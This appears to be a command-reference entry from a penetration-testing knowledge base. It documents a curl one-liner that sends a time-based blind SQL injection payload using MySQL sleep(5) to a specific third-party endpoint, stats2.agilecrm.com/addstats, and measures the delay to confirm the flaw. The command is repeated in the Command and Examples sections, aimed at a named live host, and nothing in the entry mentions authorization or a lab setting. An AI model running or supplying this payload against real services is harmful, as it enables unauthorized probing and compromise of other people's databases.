---
id: cmd-433792-curl-time
data: >-
  curl -w "%{time_total}s"
  'https://stats2.agilecrm.com/addstats?new=(select*from(select(sleep(5)))a)'
tags:
  - sqli
  - time-based
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:07.759Z'
verified: false
validated: true
submitted: true
---
# curl-time-based-payload

## Command

```bash
curl -w "%{time_total}s" 'https://stats2.agilecrm.com/addstats?new=(select*from(select(sleep(5)))a)'
```

## Description

Injects a MySQL SLEEP payload and times the response to confirm Blind SQLi via delay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-w` | Write format for time output | Yes |
| Payload | Time-based SQL injection | Yes |

## Examples

### Basic Usage

```bash
curl -w "%{time_total}s" 'https://stats2.agilecrm.com/addstats?new=(select*from(select(sleep(5)))a)'
```

### Advanced Usage

```bash
curl -w "%{time_total}s" -m 10 'https://stats2.agilecrm.com/addstats?new=...'
```

## Expected Output

Response followed by total time (e.g., 5.123s), indicating delay.

## Related

- [[Related Procedure]]
